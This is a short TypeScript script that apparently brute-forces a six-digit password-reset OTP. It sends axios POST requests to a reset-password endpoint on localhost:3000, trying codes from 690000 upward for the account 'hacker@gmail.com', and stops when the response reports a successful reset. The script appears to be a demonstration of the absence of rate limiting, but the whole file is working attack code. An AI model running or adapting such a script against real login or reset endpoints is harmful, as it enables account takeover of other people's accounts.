import axios from "axios";

async function main() {
  //   const generatotp = await axios.post("http://localhost:3000/generate-otp", {
  //     data: {
  //       email: "hacker@gmail.com",
  //     },
  //   });

  try {
    for (let i = 690000; i < 1000000; i++) {
      console.log("i is " + i);
      const result = await axios.post("http://localhost:3000/reset-password", {
        email: "hacker@gmail.com",
        newPassword: "random",
        otp: i.toString(),
      });
      console.log(result.data);
      if (result.data.msg === "Password reset successfully") break;
    }
  } catch (e: any) {}
}

main();
